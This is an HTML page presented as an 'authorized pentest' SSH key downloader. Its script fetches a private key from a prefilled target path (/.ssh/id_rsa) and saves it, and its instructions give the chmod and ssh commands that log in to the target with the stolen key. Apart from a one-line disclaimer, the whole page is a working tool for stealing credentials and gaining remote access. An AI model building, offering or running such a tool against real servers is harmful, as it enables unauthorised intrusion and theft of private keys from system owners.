<!DOCTYPE html>
<html>
<head>
  <title>SSH Key Downloader (Authorized Pentest)</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
      line-height: 1.6;
    }
    button {
      background-color: #4CAF50;
      color: white;
      padding: 10px 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #45a049;
    }
    #status {
      margin-top: 20px;
      padding: 10px;
      border-radius: 4px;
    }
    .success {
      background-color: #dff0d8;
      color: #3c763d;
    }
    .error {
      background-color: #f2dede;
      color: #a94442;
    }
    pre {
      background-color: #f5f5f5;
      padding: 10px;
      border-radius: 4px;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <h1>SSH Key Downloader</h1>
  <p>For authorized penetration testing only</p>

  <div>
    <label for="keyUrl">SSH Key URL:</label><br>
    <input type="text" id="keyUrl" value="http://target-server.com/.ssh/id_rsa"
           style="width: 100%; padding: 8px; margin: 8px 0;"><br>

    <label for="keyName">Save As:</label><br>
    <input type="text" id="keyName" value="downloaded_ssh_key"
           style="width: 100%; padding: 8px; margin: 8px 0;"><br>

    <button onclick="downloadSSHKey()">Download SSH Key</button>
  </div>

  <div id="status"></div>

  <h3>Post-Download Instructions:</h3>
  <pre>
chmod 600 downloaded_ssh_key
ssh -i downloaded_ssh_key user@target-server.com
  </pre>

  <script>
    async function downloadSSHKey() {
      const url = document.getElementById("keyUrl").value;
      const filename = document.getElementById("keyName").value;
      const status = document.getElementById("status");
      status.textContent = "Downloading...";
      status.className = "";

      try {
        const response = await fetch(url);
        if (!response.ok) throw new Error("HTTP " + response.status);

        const blob = await response.blob();
        const link = document.createElement("a");
        link.href = window.URL.createObjectURL(blob);
        link.download = filename;
        link.click();

        status.textContent = "SSH key downloaded successfully.";
        status.className = "success";
      } catch (err) {
        status.textContent = "Error: " + err.message;
        status.className = "error";
      }
    }
  </script>
</body>
</html>
